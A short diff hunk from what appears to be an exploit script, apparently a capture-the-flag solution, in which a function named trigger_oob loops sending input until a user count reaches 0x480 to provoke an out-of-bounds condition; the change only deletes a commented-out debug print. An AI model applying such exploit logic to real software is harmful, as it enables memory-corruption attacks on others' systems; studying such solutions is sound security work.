@@ -84,8 +84,6 @@ def trigger_oob(how_many, name, money):
 	
 	while True:
 
-		#print g_user_count
-
 		if g_user_count == 0x480:
 			break
 		r.sendlineafter('#{}: '.format(count), name)
